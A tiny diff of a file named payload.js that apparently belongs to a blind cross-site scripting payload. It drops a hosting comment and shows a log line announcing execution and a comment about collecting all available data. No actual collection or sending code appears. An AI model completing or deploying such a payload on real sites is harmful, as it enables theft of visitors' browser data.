@@ -1,4 +1,4 @@
-// payload.js - This will be hosted at: https://yourusername.github.io/repo-name/payload.js
+
 console.log("Blind XSS payload executed!");
 
 // Collect all available data
